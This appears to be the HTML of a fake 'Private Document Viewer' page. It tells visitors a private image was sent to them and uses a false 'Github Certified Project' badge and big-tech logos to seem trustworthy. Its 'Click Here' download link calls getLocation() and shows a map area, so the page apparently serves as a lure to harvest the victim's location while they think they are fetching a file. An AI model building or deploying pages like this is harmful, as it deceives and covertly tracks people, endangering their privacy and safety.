<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://cdn.jsdelivr.net/npm/remixicon@4.2.0/fonts/remixicon.css" rel="stylesheet" />
  <link
    href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@200..900&family=Outfit:wght@100..900&display=swap"
    rel="stylesheet">
  <title>Private Document Viewer</title>
</head>

<body>

  <h4>Cutting the Crap. Simple Private image Viewer</h4>

  <div class="container">

    <header><i class="ri-github-fill"></i>Github Certified Project</header>

    <h1>Private Document Viewer</h1>

    <div class="message-info">
      <p>You were sent a <strong>private document</strong>. Please view the contents of the image and delete after
        viewing.</p>
    </div>

    <div class="file-info">
      <!-- <i class="ri-folder-image-line"></i> -->
      <i class="ri-lock-line"></i>

      <!-- <img src="/images/document-lock-svgrepo-com.svg" alt="" height="80px"> -->
      <p>socialFront.jpg</p>
    </div>

    <p>Click to Download</p>

    <!-- <button onclick="getLocation()"><a href="/images/Social-Front.jpg">Download<i class="ri-download-line"></i></a> -->
    <button><a href="#">Download<i class="ri-download-line"></i></a>



    </button>
    <div class="download-issues">
      <p>Issues Downloading? <a href="/images/Social-Front.jpg" onclick="getLocation()">Click Here</a></p>
    </div>
    <p id="demo"></p>


    <div id="googleMap" style="width:100%;height:400px;"></div>
    <div class="bottom">
      <img src="/images/google.svg" alt="" height="30px">
      <img src="/images/facebook.svg" alt="" height="30px">
      <img src="/images/microsoft.svg" alt="" height="30px">
    </div>
  </div>
  <script src="index.js"></script>



</body>

</html>
